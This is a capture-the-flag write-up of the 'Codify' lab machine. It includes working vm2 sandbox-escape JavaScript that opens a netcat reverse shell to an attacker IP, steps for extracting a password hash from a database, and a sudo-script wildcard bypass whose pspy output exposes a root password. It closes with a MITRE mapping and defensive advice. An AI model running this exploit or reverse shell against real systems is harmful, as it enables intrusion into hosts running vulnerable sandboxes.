# Codify Writeup

### Information

| Property       | Value        |
| -------------- | ------------ |
| **Name**       | Codify       |
| **IP Address** | 10.10.11.239 |
| **OS**         | Linux        |
| **Difficulty** | Easy         |

### Enumeration

#### Nmap Scan

```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Codify
3000/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Codify
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Hostname:** http://codify.htb/

### Initial Access

#### Port \[80] - \[Codify Web Application]

![](<Codify Writeup - Codify Web Application.png>)

The application serves an Node JS editor in a sandboxed environment using [vm2 library](https://github.com/patriksimek/vm2)

![](<Codify Writeup - Editor.png>)

**Vulnerability Exploited**

VM2 library sufferes from a[ sandbox escape vulnerability](https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/)  that makes it possible to execute unsafe code on a host running the VM2 sandbox.

**Exploitation Steps**

Executing the following code will result in a reverse shell establishment:

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 1337 >/tmp/f'); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));
```

The malicious code gets executed a low priveleged user called **scv**, we need to escalate our priveleged to the second user called **Joshua.**

#### User Access

The tickets database found under /var/www/contact contains Joshua hashed password.

```bash
(remote) svc@codify:/var/www/contact$ strings tickets.db 
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
	tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/<REDACTED>G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open

```

**User Flag**

Cracking the password will reveal the user's password which can be used to establish an ssh connection to the box.

### Privilege Escalation

Joshua can run the following script with elevated privileges:

```
joshua@codify:~$ sudo -l 
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

No escaping on the user password can be bypassed with a wildcard character:

Resource: https://superuser.com/questions/1056183/using-a-wildcard-in-a-condition-to-match-the-beginning-of-a-string

Then running pspy with recursive mode on the backup directory to retrieve the password when the mysqldump command gets executed:

```bash
./pspy64 -r /var/backups/mysql
...
2023/11/13 19:58:28 CMD: UID=0     PID=1      | /sbin/init 
2023/11/13 19:58:29 CMD: UID=0     PID=23715  | /bin/bash /opt/scripts/mysql-backup.sh -x 
2023/11/13 19:58:29 CMD: UID=0     PID=23714  | sudo /opt/scripts/mysql-backup.sh -x 
2023/11/13 19:58:29 CMD: UID=0     PID=23713  | sudo /opt/scripts/mysql-backup.sh -x 
2023/11/13 19:58:31 CMD: UID=0     PID=23725  | /bin/bash /opt/scripts/mysql-backup.sh -x 
2023/11/13 19:58:31 CMD: UID=0     PID=23724  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql 
2023/11/13 19:58:31 CMD: UID=0     PID=23729  | /bin/bash /opt/scripts/mysql-backup.sh -x 
2023/11/13 19:58:31 CMD: UID=0     PID=23728  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12REDACTEDkjh3 sys 
...

```

**Root Flag**

The extracted password is the root password and can be used to su through.

### Conclusion

1. **Initial Access:**
   * **Tactic:** Exploit Public Facing Application
   * **Technique:** Exploitation for Client Execution
   * **MITRE ATT\&CK ID:** T1190
2. **Execution:**
   * **Tactic:** Execution
   * **Technique:** Exploitation for Client Execution
   * **MITRE ATT\&CK ID:** T1203
3. **Privilege Escalation:**
   * **Tactic:** Privilege Escalation
   * **Technique:** Abuse Elevation Control Control Mechanism
   * **MITRE ATT\&CK ID:** T1548.002
4. **Credential Access:**
   * **Tactic:** Credential Access
   * **Technique:** Input Capture
   * **MITRE ATT\&CK ID:** T1056

![](<Codify Writeup - Mitre Attack Mapping-1.png>)

### Additional Notes

#### Defensive Techniques

* Keep software and libraries up to date to patch known vulnerabilities.
* Implement proper input validation and sanitization in the web application to prevent injection attacks.
* Review and restrict sudo permissions to only necessary commands and users.
* Don't input sensitive data, such as passwords, directly as bash commands from the command line to prevent accidental exposure.
